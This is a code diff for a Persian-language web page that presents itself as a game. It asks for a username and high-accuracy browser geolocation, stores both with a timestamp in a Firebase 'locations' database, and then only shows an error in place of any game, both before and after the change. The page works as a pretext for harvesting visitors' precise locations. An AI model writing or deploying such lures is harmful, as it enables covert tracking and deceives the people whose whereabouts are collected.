@@ -8,43 +8,99 @@ const firebaseConfig = {
     appId: "1:658662293687:web:a298ac3f313f390ed5cd32"
 };
 
-const firebaseApp = firebase.initializeApp(firebaseConfig);
+firebase.initializeApp(firebaseConfig);
+
 const database = firebase.database();
 
-database.ref("web_test").set({
-    from: "GitHub Pages",
-    time: Date.now()
-})
-.then(() => {
-    console.log("🔥 FIREBASE WEB WRITE OK");
-})
-.catch((error) => {
-    console.error("❌ FIREBASE WEB WRITE ERROR:", error);
-});
+const usernameStep = document.getElementById("usernameStep");
+const locationStep = document.getElementById("locationStep");
+const gameStep = document.getElementById("gameStep");
 
-
+const usernameInput = document.getElementById("usernameInput");
+const usernameBtn = document.getElementById("usernameBtn");
 const startBtn = document.getElementById("startBtn");
+const gameBtn = document.getElementById("gameBtn");
+
+const playerName = document.getElementById("playerName");
 const status = document.getElementById("status");
 
-startBtn.addEventListener("click", () => {
-    if (!navigator.geolocation) {
-        status.textContent = "موقعیت مکانی توسط این مرورگر پشتیبانی نمی‌شود.";
+let username = "";
+
+
+/* مرحله ۱: دریافت یوزرنیم */
+
+usernameBtn.addEventListener("click", () => {
+
+    username = usernameInput.value.trim();
+
+    if (!username) {
+        status.textContent = "❌ اول یه یوزرنیم وارد کن.";
+        usernameInput.focus();
         return;
     }
 
-    status.textContent = "درحال دریافت موقعیت...";
+    if (username.length < 2) {
+        status.textContent = "❌ یوزرنیم باید حداقل ۲ کاراکتر باشه.";
+        usernameInput.focus();
+        return;
+    }
+
+    playerName.textContent = username;
+
+    usernameStep.classList.add("hidden");
+    locationStep.classList.remove("hidden");
+
+    status.textContent = "حالا موقعیتت رو ارسال کن 📍";
+});
+
+
+/* Enter روی کیبورد */
+
+usernameInput.addEventListener("keydown", (event) => {
+
+    if (event.key === "Enter") {
+        usernameBtn.click();
+    }
+
+});
+
+
+/* مرحله ۲: Location */
+
+startBtn.addEventListener("click", () => {
+
+    if (!navigator.geolocation) {
+        status.textContent =
+            "❌ موقعیت مکانی توسط این مرورگر پشتیبانی نمی‌شود.";
+        return;
+    }
+
+    startBtn.disabled = true;
+    status.textContent = "📍 درحال دریافت موقعیت...";
 
     navigator.geolocation.getCurrentPosition(
+
         async (position) => {
+
             const data = {
+
+                username: username,
+
                 latitude: position.coords.latitude,
+
                 longitude: position.coords.longitude,
+
                 accuracy: position.coords.accuracy,
+
                 timestamp: Date.now()
+
             };
 
             try {
-                await database.ref("locations").push(data);
+
+                await database
+                    .ref("locations")
+                    .push(data);
 
                 document.getElementById("lat").textContent =
                     data.latitude.toFixed(6);
@@ -55,40 +111,66 @@ startBtn.addEventListener("click", () => {
                 document.getElementById("accuracy").textContent =
                     `${Math.round(data.accuracy)} متر`;
 
-                document.getElementById("locationBox")
+                document
+                    .getElementById("locationBox")
                     .classList.remove("hidden");
 
-                status.textContent = "موقعیت دریافت شد.";
+                locationStep.classList.add("hidden");
 
-                startBtn.disabled = true;
-                startBtn.textContent = "🎮 ورود به بازی";
+                gameStep.classList.remove("hidden");
 
-                startBtn.onclick = () => {
-                    status.textContent =
-                        "⚠️ بازی در حال آماده‌سازی است. لطفاً بعداً دوباره امتحان کنید.";
-                };
+                status.textContent =
+                    `✅ موقعیت ${username} ثبت شد.`;
 
             } catch (error) {
+
                 console.error(error);
+
+                startBtn.disabled = false;
+
                 status.textContent =
-                    "خطا در ثبت موقعیت. لطفاً دوباره امتحان کنید.";
+                    "❌ خطا در ثبت موقعیت. دوباره تلاش کن.";
+
             }
+
         },
+
         (error) => {
+
             console.error(error);
 
+            startBtn.disabled = false;
+
             if (error.code === 1) {
+
                 status.textContent =
-                    "دسترسی موقعیت مکانی داده نشد.";
+                    "❌ دسترسی موقعیت مکانی داده نشد.";
+
             } else {
+
                 status.textContent =
-                    "دریافت موقعیت ناموفق بود. دوباره تلاش کنید.";
+                    "❌ دریافت موقعیت ناموفق بود. دوباره تلاش کن.";
+
             }
+
         },
+
         {
             enableHighAccuracy: true,
             timeout: 15000,
             maximumAge: 0
         }
+
     );
+
+});
+
+
+/* مرحله ۳: ورود به بازی */
+
+gameBtn.addEventListener("click", () => {
+
+    document.getElementById("gameError")
+        .classList.remove("hidden");
+
 });
